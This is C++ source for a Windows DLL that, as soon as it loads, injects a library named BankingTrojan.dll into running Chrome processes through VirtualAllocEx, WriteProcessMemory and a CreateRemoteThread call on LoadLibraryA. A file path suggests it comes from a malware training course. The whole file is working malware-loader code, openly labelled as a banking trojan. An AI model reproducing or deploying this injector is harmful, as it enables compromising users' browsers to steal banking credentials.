#include <windows.h>
#include "pch.h"
#include< cstdio>
#include <tlhelp32.h>
#include<iostream>

using namespace std;

DWORD GetProcessIDByName(const std::wstring& processName) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to take snapshot of processes" << std::endl;
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);


    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (processName == pe32.szExeFile) {
                CloseHandle(hProcessSnap);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return 0;
}

extern "C" __declspec(dllexport) void StartBankingTrojan() {
    char dllname[150] = "C:/Users/zhang/Downloads/class3/malware/T5Camp_2025_Trojan/Chrome/BankingTrojan.dll";
    std::wstring processName = L"chrome.exe";
    DWORD pid = GetProcessIDByName(processName);
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

    int size = strlen(dllname) + 1;
    PVOID procdlladdr = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (procdlladdr == NULL) {
        printf("handle %p VittualAllocEX failed\n", hprocess);

    }

    SIZE_T writenum;
    if (!WriteProcessMemory(hprocess, procdlladdr, dllname, size, &writenum)) {
        printf("handle %p WriteProcessMemory failed\n", hprocess);

    }

    FARPROC loadfuncaddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (!loadfuncaddr) {
        DWORD err = GetLastError();
        printf("GetProcAddress failed. Error code: %lu\n", err);

    }

    HANDLE hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)loadfuncaddr, (LPVOID)procdlladdr, 0, NULL);
    if (!hthread) {
        DWORD err = GetLastError();
        printf("CreateRemoteThread failed. Error code: %lu\n", err);

    }

    CloseHandle(hthread);
    CloseHandle(hprocess);

}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        StartBankingTrojan();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
